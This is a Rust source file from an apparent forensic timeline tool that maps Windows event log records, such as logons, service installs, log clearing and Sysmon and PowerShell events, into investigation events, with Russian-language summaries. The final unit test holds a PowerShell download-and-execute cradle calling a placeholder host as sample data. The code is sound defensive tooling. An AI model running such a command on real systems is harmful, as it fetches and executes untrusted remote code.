//! Windows event log (`.evtx`) parsing.
//!
//! A `.evtx` file is binary, so it never goes through the text line pipeline.
//! The `evtx` crate renders each record to JSON; we map the investigation-
//! relevant records to the same [`LogEvent`] the Linux parsers produce, so
//! Windows and Linux evidence land on one UTC timeline and feed the same
//! detectors, cross-host links and report.
//!
//! Only records that matter to an investigation become timeline events
//! (logons, process creation, account and group changes, service and task
//! persistence, log clearing, PowerShell, Defender, Sysmon, OpenSSH). The vast
//! routine remainder of a Security log (logoff, handle operations, object
//! access) is counted and skipped, keeping the timeline readable. The raw
//! `.evtx` stays on disk, hashed, as the untouched evidence.

use std::collections::BTreeMap;
use std::fs;
use std::path::Path;

use chrono::{DateTime, Utc};
use serde_json::Value;
use sha2::{Digest, Sha256};

use crate::{LogEvent, LogSource, Outcome};

/// Longest raw/field text kept per event (a PowerShell script block can be
/// enormous); the whole record remains in the `.evtx` on disk.
const MAX_TEXT: usize = 8192;

/// Result of reading one `.evtx` file.
pub struct EvtxOutput {
    pub events: Vec<LogEvent>,
    /// Records examined (bounded by the event budget).
    pub total_records: usize,
    /// Routine records intentionally not placed on the timeline.
    pub skipped_routine: usize,
    /// Records the `evtx` crate could not decode (corrupt/truncated).
    pub read_errors: usize,
    /// SHA-256 of the file on disk (chain of custody).
    pub sha256: String,
    pub bytes: u64,
}

/// Read a `.evtx` file into timeline events, emitting at most `budget` events.
pub fn parse_evtx_file(path: &Path, max_bytes: u64, budget: usize) -> Result<EvtxOutput, String> {
    let meta = fs::metadata(path).map_err(|e| e.to_string())?;
    if meta.len() > max_bytes {
        return Err(format!(
            "размер {} превышает предел {} МБ",
            meta.len(),
            max_bytes / (1024 * 1024)
        ));
    }
    let raw = fs::read(path).map_err(|e| e.to_string())?;
    let bytes = raw.len() as u64;
    let sha256 = {
        let mut h = Sha256::new();
        h.update(&raw);
        hex::encode(h.finalize())
    };

    let mut parser =
        evtx::EvtxParser::from_buffer(raw).map_err(|e| format!("не удалось открыть .evtx: {e}"))?;

    let mut out = EvtxOutput {
        events: Vec::new(),
        total_records: 0,
        skipped_routine: 0,
        read_errors: 0,
        sha256,
        bytes,
    };
    for rec in parser.records_json_value() {
        if out.events.len() >= budget {
            break;
        }
        out.total_records += 1;
        match rec {
            Ok(r) => match event_from_json(&r.data, r.timestamp.as_second(), r.event_record_id) {
                Some(ev) => out.events.push(ev),
                None => out.skipped_routine += 1,
            },
            // A single corrupt record never aborts the file: count it and move
            // on, so the rest of the log is still analyzed.
            Err(_) => out.read_errors += 1,
        }
    }
    Ok(out)
}

/// Canonical fixed-width UTC rendering (second precision), matching the text
/// parser so lexicographic order equals chronological order.
fn render_secs(secs: i64) -> String {
    DateTime::<Utc>::from_timestamp(secs, 0)
        .unwrap_or_default()
        .format("%Y-%m-%dT%H:%M:%SZ")
        .to_string()
}

/// Map one `evtx`-rendered JSON record to a [`LogEvent`], or `None` when the
/// record is routine and should not clutter the timeline. Pure and panic-free:
/// it never indexes or unwraps, so malformed JSON yields `None`, not a crash.
pub(crate) fn event_from_json(data: &Value, ts_secs: i64, record_id: u64) -> Option<LogEvent> {
    // The crate wraps everything under "Event"; tolerate its absence.
    let event = data.get("Event").unwrap_or(data);
    let system = event.get("System")?;
    let id = event_id(system)?;
    let channel = as_text(system.get("Channel")).unwrap_or_default();
    let computer = as_text(system.get("Computer"));
    let provider = provider_name(system).unwrap_or_default();

    let null = Value::Null;
    let ed = event.get("EventData").unwrap_or(&null);

    let mapped = classify(&provider, &channel, id, ed)?;

    let mut fields: BTreeMap<String, String> = BTreeMap::new();
    fields.insert("event_id".into(), id.to_string());
    if !channel.is_empty() {
        fields.insert("channel".into(), channel.clone());
    }
    if !provider.is_empty() {
        fields.insert("provider".into(), provider);
    }
    for (k, v) in mapped.fields {
        fields.insert(k.into(), truncate(&v));
    }

    let compact = serde_json::to_string(ed).unwrap_or_default();
    let raw = truncate(&format!("EID {id} {channel}: {compact}"));

    Some(LogEvent {
        timestamp: render_secs(ts_secs),
        source: LogSource::WindowsEvent,
        source_file: String::new(),
        line_no: record_id as usize,
        host: computer,
        actor: mapped.actor,
        summary: mapped.summary,
        outcome: mapped.outcome,
        fields,
        raw,
    })
}

/// A mapped, investigation-relevant record.
struct Mapped {
    summary: String,
    actor: Option<String>,
    outcome: Option<Outcome>,
    fields: Vec<(&'static str, String)>,
}

impl Mapped {
    fn new(summary: String) -> Self {
        Mapped {
            summary,
            actor: None,
            outcome: None,
            fields: Vec::new(),
        }
    }
    fn actor(mut self, a: Option<String>) -> Self {
        self.actor = a;
        self
    }
    fn outcome(mut self, o: Outcome) -> Self {
        self.outcome = Some(o);
        self
    }
    fn field(mut self, k: &'static str, v: Option<String>) -> Self {
        if let Some(v) = v {
            self.fields.push((k, v));
        }
        self
    }
}

/// Decide whether and how a record becomes a timeline event, by provider/
/// channel family then event id.
fn classify(provider: &str, channel: &str, id: i64, ed: &Value) -> Option<Mapped> {
    let p = provider.to_ascii_lowercase();
    let ch = channel.to_ascii_lowercase();

    if p.contains("sysmon") {
        return sysmon(id, ed);
    }
    if p.contains("defender") || ch.contains("defender") {
        return defender(id, ed);
    }
    if p.contains("powershell") {
        return powershell(id, ed);
    }
    if p.contains("openssh") {
        return openssh(id, ed);
    }
    if ch == "security" || p.contains("security-auditing") {
        return security(id, ed);
    }
    if ch == "system" {
        return system(id, ed);
    }
    None
}

// ---------------------------------------------------------------------------
// Security channel
// ---------------------------------------------------------------------------

fn security(id: i64, ed: &Value) -> Option<Mapped> {
    let m = match id {
        4624 => {
            // Successful logon. Drop the overwhelming service/system noise so
            // the timeline shows real interactive and network logons.
            let lt = f(ed, "LogonType");
            let user = f(ed, "TargetUserName");
            if is_noise_logon(user.as_deref(), lt.as_deref()) {
                return None;
            }
            let who = user.clone().unwrap_or_else(|| "?".into());
            Mapped::new(format!(
                "Вход в систему: {who} ({})",
                logon_type_label(lt.as_deref())
            ))
            .actor(user)
            .outcome(Outcome::Success)
            .field("logon_type", lt)
            .field("ip", f(ed, "IpAddress"))
            .field("workstation", f(ed, "WorkstationName"))
            .field("logon_process", f(ed, "LogonProcessName"))
        }
        4625 => {
            // Failed logon — always kept (the brute-force signal).
            let user = f(ed, "TargetUserName");
            let who = user.clone().unwrap_or_else(|| "?".into());
            Mapped::new(format!("Неуспешный вход: {who}"))
                .actor(user)
                .outcome(Outcome::Failure)
                .field("logon_type", f(ed, "LogonType"))
                .field("ip", f(ed, "IpAddress"))
                .field("status", f(ed, "Status"))
                .field("sub_status", f(ed, "SubStatus"))
                .field("workstation", f(ed, "WorkstationName"))
        }
        4648 => {
            let subj = f(ed, "SubjectUserName");
            let target = f(ed, "TargetUserName");
            let srv = f(ed, "TargetServerName");
            Mapped::new(format!(
                "Вход с явными учётными данными: {} → {}{}",
                subj.clone().unwrap_or_else(|| "?".into()),
                target.clone().unwrap_or_else(|| "?".into()),
                srv.as_deref()
                    .map(|s| format!(" ({s})"))
                    .unwrap_or_default()
            ))
            .actor(subj)
            .field("target_user", target)
            .field("target_server", srv)
            .field("ip", f(ed, "IpAddress"))
        }
        4672 => {
            let subj = f(ed, "SubjectUserName");
            if is_system_account(subj.as_deref()) {
                return None;
            }
            let who = subj.clone().unwrap_or_else(|| "?".into());
            Mapped::new(format!("Назначены привилегии администратора: {who}")).actor(subj)
        }
        4720 => account(ed, "Создана учётная запись"),
        4722 => account(ed, "Включена учётная запись"),
        4725 => account(ed, "Отключена учётная запись"),
        4726 => account(ed, "Удалена учётная запись"),
        4738 => account(ed, "Изменена учётная запись"),
        4723 => account(ed, "Смена пароля пользователем"),
        4724 => account(ed, "Сброс пароля администратором"),
        4740 => account(ed, "Блокировка учётной записи"),
        4728 | 4732 | 4756 => group_change(ed, "Добавление в группу"),
        4729 | 4733 | 4757 => group_change(ed, "Удаление из группы"),
        4697 => {
            let name = f(ed, "ServiceName");
            Mapped::new(format!(
                "Установлена служба (Security): {}",
                name.clone().unwrap_or_else(|| "?".into())
            ))
            .field("service_name", name)
            .field("service_file", f(ed, "ServiceFileName"))
        }
        4698 => task(ed, "Создана задача планировщика"),
        4699 => task(ed, "Удалена задача планировщика"),
        4702 => task(ed, "Изменена задача планировщика"),
        4700 => task(ed, "Включена задача планировщика"),
        4719 => {
            Mapped::new("Изменена политика аудита системы".into()).actor(f(ed, "SubjectUserName"))
        }
        1102 => {
            let by = f(ed, "SubjectUserName");
            Mapped::new(format!(
                "Очищен журнал безопасности (кем: {})",
                by.clone().unwrap_or_else(|| "?".into())
            ))
            .actor(by)
        }
        4771 => {
            // Kerberos pre-authentication failed — the domain equivalent of 4625.
            let user = f(ed, "TargetUserName");
            let who = user.clone().unwrap_or_else(|| "?".into());
            Mapped::new(format!("Kerberos: ошибка предаутентификации: {who}"))
                .actor(user)
                .outcome(Outcome::Failure)
                .field("ip", f(ed, "IpAddress"))
                .field("failure_code", f(ed, "Status"))
        }
        _ => return None,
    };
    Some(m)
}

fn account(ed: &Value, verb: &str) -> Mapped {
    let target = f(ed, "TargetUserName");
    let by = f(ed, "SubjectUserName");
    Mapped::new(format!(
        "{verb}: {}",
        target.clone().unwrap_or_else(|| "?".into())
    ))
    .actor(target)
    .field("by", by)
}

fn group_change(ed: &Value, verb: &str) -> Mapped {
    let group = f(ed, "TargetUserName");
    let member = f(ed, "MemberName").or_else(|| f(ed, "MemberSid"));
    let by = f(ed, "SubjectUserName");
    Mapped::new(format!(
        "{verb} {}: {}",
        group.clone().unwrap_or_else(|| "?".into()),
        member.clone().unwrap_or_else(|| "?".into())
    ))
    .actor(member)
    .field("group", group)
    .field("by", by)
}

fn task(ed: &Value, verb: &str) -> Mapped {
    let name = f(ed, "TaskName");
    Mapped::new(format!(
        "{verb}: {}",
        name.clone().unwrap_or_else(|| "?".into())
    ))
    .actor(f(ed, "SubjectUserName"))
    .field("task_name", name)
}

// ---------------------------------------------------------------------------
// System channel
// ---------------------------------------------------------------------------

fn system(id: i64, ed: &Value) -> Option<Mapped> {
    let m = match id {
        7045 => {
            let name = f(ed, "ServiceName");
            Mapped::new(format!(
                "Установлена служба: {}",
                name.clone().unwrap_or_else(|| "?".into())
            ))
            .field("service_name", name)
            .field("image_path", f(ed, "ImagePath"))
            .field("service_type", f(ed, "ServiceType"))
            .field("start_type", f(ed, "StartType"))
        }
        7040 => {
            let name = f(ed, "param1").or_else(|| f(ed, "ServiceName"));
            Mapped::new(format!(
                "Изменён тип запуска службы: {}",
                name.clone().unwrap_or_else(|| "?".into())
            ))
            .field("service_name", name)
        }
        104 => Mapped::new("Очищен журнал событий (System)".into()),
        6005 => Mapped::new("Служба журнала событий запущена (загрузка системы)".into()),
        6006 => Mapped::new("Служба журнала событий остановлена (штатное завершение)".into()),
        6008 => Mapped::new("Непредвиденное завершение работы системы".into()),
        _ => return None,
    };
    Some(m)
}

// ---------------------------------------------------------------------------
// PowerShell / Defender / Sysmon / OpenSSH
// ---------------------------------------------------------------------------

fn powershell(id: i64, ed: &Value) -> Option<Mapped> {
    match id {
        4104 => {
            let script = f(ed, "ScriptBlockText");
            let path = f(ed, "Path");
            Some(
                Mapped::new(format!(
                    "PowerShell: выполнение блока сценария{}",
                    path.as_deref()
                        .map(|p| format!(" ({p})"))
                        .unwrap_or_default()
                ))
                .field("script", script)
                .field("path", path),
            )
        }
        _ => None,
    }
}

fn defender(id: i64, ed: &Value) -> Option<Mapped> {
    let threat = f(ed, "Threat Name")
        .or_else(|| f(ed, "ThreatName"))
        .or_else(|| f(ed, "Threat ID"));
    let m = match id {
        1116 | 1006 => Mapped::new(format!(
            "Defender: обнаружено вредоносное ПО: {}",
            threat.clone().unwrap_or_else(|| "?".into())
        ))
        .field("threat", threat)
        .field("path", f(ed, "Path")),
        1117..=1119 => Mapped::new(format!(
            "Defender: приняты меры по угрозе: {}",
            threat.clone().unwrap_or_else(|| "?".into())
        ))
        .field("threat", threat),
        1015 => Mapped::new(format!(
            "Defender: подозрительное поведение: {}",
            threat.clone().unwrap_or_else(|| "?".into())
        ))
        .field("threat", threat),
        5001 => Mapped::new("Defender: защита в реальном времени отключена".into()),
        5007 => Mapped::new("Defender: изменена конфигурация защиты".into()),
        _ => return None,
    };
    Some(m)
}

fn sysmon(id: i64, ed: &Value) -> Option<Mapped> {
    let m = match id {
        1 => {
            let image = f(ed, "Image");
            Mapped::new(format!(
                "Процесс запущен: {}",
                image.clone().unwrap_or_else(|| "?".into())
            ))
            .actor(f(ed, "User"))
            .field("image", image)
            .field("command_line", f(ed, "CommandLine"))
            .field("parent_image", f(ed, "ParentImage"))
            .field("parent_command_line", f(ed, "ParentCommandLine"))
            .field("hashes", f(ed, "Hashes"))
        }
        3 => {
            let image = f(ed, "Image");
            let dip = f(ed, "DestinationIp");
            let dport = f(ed, "DestinationPort");
            Mapped::new(format!(
                "Сетевое подключение: {} → {}:{}",
                image.clone().unwrap_or_else(|| "?".into()),
                dip.clone().unwrap_or_else(|| "?".into()),
                dport.clone().unwrap_or_else(|| "?".into())
            ))
            .actor(f(ed, "User"))
            .field("image", image)
            .field("dest_ip", dip)
            .field("dest_port", dport)
        }
        11 => {
            let file = f(ed, "TargetFilename");
            Mapped::new(format!(
                "Создан файл: {}",
                file.clone().unwrap_or_else(|| "?".into())
            ))
            .field("target_filename", file)
            .field("image", f(ed, "Image"))
        }
        13 => {
            let obj = f(ed, "TargetObject");
            Mapped::new(format!(
                "Изменение реестра: {}",
                obj.clone().unwrap_or_else(|| "?".into())
            ))
            .field("target_object", obj)
            .field("details", f(ed, "Details"))
            .field("image", f(ed, "Image"))
        }
        22 => {
            let q = f(ed, "QueryName");
            Mapped::new(format!(
                "DNS-запрос: {}",
                q.clone().unwrap_or_else(|| "?".into())
            ))
            .field("query", q)
            .field("image", f(ed, "Image"))
        }
        _ => return None,
    };
    Some(m)
}

fn openssh(id: i64, ed: &Value) -> Option<Mapped> {
    if id != 4 {
        return None;
    }
    let msg = f(ed, "payload")
        .or_else(|| f(ed, "Data"))
        .or_else(|| first_string(ed))?;
    let outcome = if msg.contains("Accepted") {
        Some(Outcome::Success)
    } else if msg.contains("Failed") || msg.contains("Invalid") {
        Some(Outcome::Failure)
    } else {
        None
    };
    let mut m = Mapped::new(format!("OpenSSH: {}", truncate(&msg)));
    if let Some(o) = outcome {
        m = m.outcome(o);
    }
    Some(m)
}

// ---------------------------------------------------------------------------
// JSON helpers (defensive: never panic)
// ---------------------------------------------------------------------------

/// Read an `EventData` field as text, treating Windows' `-` placeholder and
/// empty strings as absent.
fn f(ed: &Value, key: &str) -> Option<String> {
    let s = as_text(ed.get(key))?;
    let t = s.trim();
    if t.is_empty() || t == "-" {
        None
    } else {
        Some(t.to_string())
    }
}

/// Any scalar (string/number/bool) as text; an object with `#text` unwraps to
/// that. Returns `None` for null/array/missing.
fn as_text(v: Option<&Value>) -> Option<String> {
    match v? {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        Value::Object(o) => as_text(o.get("#text")),
        _ => None,
    }
}

fn as_i64(v: Option<&Value>) -> Option<i64> {
    match v? {
        Value::Number(n) => n.as_i64(),
        Value::String(s) => s.trim().parse().ok(),
        Value::Object(o) => as_i64(o.get("#text")),
        _ => None,
    }
}

fn event_id(system: &Value) -> Option<i64> {
    as_i64(system.get("EventID"))
}

/// `System.Provider` carries the name in `#attributes.Name` (or, rarely, a
/// plain `Name`).
fn provider_name(system: &Value) -> Option<String> {
    let p = system.get("Provider")?;
    as_text(p.get("#attributes").and_then(|a| a.get("Name"))).or_else(|| as_text(p.get("Name")))
}

fn first_string(v: &Value) -> Option<String> {
    if let Value::Object(o) = v {
        for val in o.values() {
            if let Some(s) = as_text(Some(val)) {
                if !s.trim().is_empty() {
                    return Some(s);
                }
            }
        }
    }
    None
}

fn truncate(s: &str) -> String {
    if s.len() <= MAX_TEXT {
        return s.to_string();
    }
    // Cut on a char boundary at or below the limit, then mark the elision.
    let mut end = MAX_TEXT;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}…", &s[..end])
}

fn logon_type_label(lt: Option<&str>) -> &'static str {
    match lt {
        Some("2") => "интерактивный",
        Some("3") => "сетевой",
        Some("4") => "пакетный",
        Some("5") => "служба",
        Some("7") => "разблокировка",
        Some("8") => "сетевой (открытый пароль)",
        Some("9") => "новые учётные данные",
        Some("10") => "удалённый рабочий стол (RDP)",
        Some("11") => "кэшированный",
        _ => "тип входа неизвестен",
    }
}

/// A successful-logon record that is almost always machine noise: the SYSTEM
/// and service logon types, machine accounts, and the built-in service
/// identities. These flood a Security log and bury the real logons.
fn is_noise_logon(user: Option<&str>, lt: Option<&str>) -> bool {
    if matches!(lt, Some("0") | Some("5")) {
        return true;
    }
    is_system_account(user)
}

fn is_system_account(user: Option<&str>) -> bool {
    match user {
        None => true,
        Some(u) => {
            let lu = u.to_ascii_lowercase();
            u.ends_with('$')
                || matches!(
                    lu.as_str(),
                    "system" | "local service" | "network service" | "local system"
                )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn ev(data: Value) -> Option<LogEvent> {
        event_from_json(&data, 1_700_000_000, 42)
    }

    #[test]
    fn successful_interactive_logon_becomes_an_event() {
        let e = ev(json!({"Event": {
            "System": {"EventID": 4624, "Channel": "Security", "Computer": "WIN-DC01"},
            "EventData": {"TargetUserName": "jdoe", "LogonType": "10", "IpAddress": "10.0.0.5"}
        }}))
        .expect("4624 interactive logon should be kept");
        assert_eq!(e.source, LogSource::WindowsEvent);
        assert_eq!(e.actor.as_deref(), Some("jdoe"));
        assert_eq!(e.host.as_deref(), Some("WIN-DC01"));
        assert_eq!(e.outcome, Some(Outcome::Success));
        assert!(e.summary.contains("RDP"), "{}", e.summary);
        assert_eq!(e.fields.get("ip").map(String::as_str), Some("10.0.0.5"));
        assert_eq!(e.line_no, 42); // record id
    }

    #[test]
    fn service_and_machine_logons_are_dropped_as_noise() {
        // LogonType 5 (service).
        assert!(ev(json!({"Event": {
            "System": {"EventID": 4624, "Channel": "Security"},
            "EventData": {"TargetUserName": "svc", "LogonType": "5"}
        }}))
        .is_none());
        // Machine account.
        assert!(ev(json!({"Event": {
            "System": {"EventID": 4624, "Channel": "Security"},
            "EventData": {"TargetUserName": "WIN-DC01$", "LogonType": "3"}
        }}))
        .is_none());
    }

    #[test]
    fn failed_logon_is_a_failure_outcome() {
        let e = ev(json!({"Event": {
            "System": {"EventID": 4625, "Channel": "Security", "Computer": "SRV"},
            "EventData": {"TargetUserName": "administrator", "IpAddress": "203.0.113.9", "LogonType": "3"}
        }}))
        .unwrap();
        assert_eq!(e.outcome, Some(Outcome::Failure));
        assert_eq!(e.actor.as_deref(), Some("administrator"));
        assert_eq!(e.fields.get("ip").map(String::as_str), Some("203.0.113.9"));
    }

    #[test]
    fn eventid_as_object_with_qualifiers_still_parses() {
        // Classic providers render EventID as {"#text": N, "#attributes": {...}}.
        let e = ev(json!({"Event": {
            "System": {"EventID": {"#text": 7045, "#attributes": {"Qualifiers": 16384}},
                       "Channel": "System"},
            "EventData": {"ServiceName": "EvilSvc", "ImagePath": "C:\\x.exe"}
        }}))
        .unwrap();
        assert!(e.summary.contains("EvilSvc"), "{}", e.summary);
        assert_eq!(
            e.fields.get("image_path").map(String::as_str),
            Some("C:\\x.exe")
        );
    }

    #[test]
    fn provider_from_attributes_routes_sysmon() {
        let e = ev(json!({"Event": {
            "System": {
                "EventID": 1,
                "Channel": "Microsoft-Windows-Sysmon/Operational",
                "Computer": "WS1",
                "Provider": {"#attributes": {"Name": "Microsoft-Windows-Sysmon"}}
            },
            "EventData": {"Image": "C:\\Windows\\System32\\cmd.exe",
                          "CommandLine": "cmd /c whoami", "User": "WS1\\bob"}
        }}))
        .unwrap();
        assert!(e.summary.starts_with("Процесс запущен"), "{}", e.summary);
        assert_eq!(e.actor.as_deref(), Some("WS1\\bob"));
        assert_eq!(
            e.fields.get("command_line").map(String::as_str),
            Some("cmd /c whoami")
        );
    }

    #[test]
    fn log_cleared_is_kept() {
        let e = ev(json!({"Event": {
            "System": {"EventID": 1102, "Channel": "Security"},
            "EventData": {"SubjectUserName": "attacker"}
        }}))
        .unwrap();
        assert!(e.summary.contains("Очищен журнал"), "{}", e.summary);
        assert_eq!(e.actor.as_deref(), Some("attacker"));
    }

    #[test]
    fn added_to_admins_group_is_kept() {
        let e = ev(json!({"Event": {
            "System": {"EventID": 4732, "Channel": "Security"},
            "EventData": {"TargetUserName": "Administrators", "MemberName": "CN=mallory",
                          "SubjectUserName": "admin"}
        }}))
        .unwrap();
        assert!(e.summary.contains("Administrators"), "{}", e.summary);
        assert_eq!(e.actor.as_deref(), Some("CN=mallory"));
    }

    #[test]
    fn routine_events_are_skipped() {
        // 4634 logoff, 5156 filtering — not on the allow-list.
        assert!(ev(
            json!({"Event": {"System": {"EventID": 4634, "Channel": "Security"},
                                     "EventData": {"TargetUserName": "x"}}})
        )
        .is_none());
        assert!(
            ev(json!({"Event": {"System": {"EventID": 5156, "Channel": "Security"}}})).is_none()
        );
    }

    #[test]
    fn malformed_json_never_panics() {
        assert!(event_from_json(&json!({}), 0, 0).is_none());
        assert!(event_from_json(&json!({"Event": {"System": {}}}), 0, 0).is_none());
        assert!(event_from_json(
            &json!({"Event": {"System": {"EventID": "notanumber"}}}),
            0,
            0
        )
        .is_none());
        assert!(event_from_json(&json!(42), 0, 0).is_none());
        // EventData as an array rather than an object must not panic.
        assert!(event_from_json(
            &json!({"Event": {"System": {"EventID": 4624, "Channel": "Security"},
                              "EventData": [1, 2, 3]}}),
            0,
            0
        )
        .is_none()); // no TargetUserName/LogonType -> system-account noise drop
    }

    #[test]
    fn powershell_script_block_is_kept_with_script_field() {
        let e = ev(json!({"Event": {
            "System": {"EventID": 4104,
                       "Channel": "Microsoft-Windows-PowerShell/Operational",
                       "Provider": {"#attributes": {"Name": "Microsoft-Windows-PowerShell"}}},
            "EventData": {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://x')"}
        }}))
        .unwrap();
        assert!(e.summary.starts_with("PowerShell"), "{}", e.summary);
        assert!(e.fields.get("script").unwrap().contains("DownloadString"));
    }
}
